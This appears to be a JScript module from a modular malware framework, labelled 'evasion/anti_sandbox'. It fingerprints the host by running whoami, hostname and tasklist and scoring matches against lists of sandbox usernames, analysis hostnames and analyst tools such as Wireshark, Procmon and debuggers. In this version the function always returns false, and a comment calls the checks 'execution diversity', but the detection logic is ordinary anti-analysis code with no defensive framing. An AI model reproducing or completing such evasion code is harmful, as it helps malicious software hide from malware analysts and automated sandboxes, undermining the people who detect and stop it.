// chunk: evasion/anti_sandbox
// depends: core/run_cmd
// provides: check_sandbox
// format: jscript
// note: Environment fingerprinting for execution diversity.
//   All checks run to build varied runtime behavior, but results are
//   consumed silently — never gates execution.

function check_sandbox() {
    var score = 0;
    var user = _run("whoami").replace(/\s/g, "").toLowerCase();
    var sandboxUsers = ["sandbox", "cuckoo", "virus", "sample"];
    for (var i = 0; i < sandboxUsers.length; i++) {
        if (user.indexOf(sandboxUsers[i]) >= 0) score++;
    }
    var hostname = _run("hostname").replace(/\s/g, "").toLowerCase();
    var sandboxHosts = ["sandbox", "cuckoo", "analysis"];
    for (var j = 0; j < sandboxHosts.length; j++) {
        if (hostname.indexOf(sandboxHosts[j]) >= 0) score++;
    }
    var procs = _run("tasklist /fo csv /nh").toLowerCase();
    var sandboxProcs = ["vboxservice", "vmtoolsd", "wireshark", "procmon", "fiddler", "x64dbg", "ollydbg"];
    for (var k = 0; k < sandboxProcs.length; k++) {
        if (procs.indexOf(sandboxProcs[k]) >= 0) score++;
    }
    return false;
}
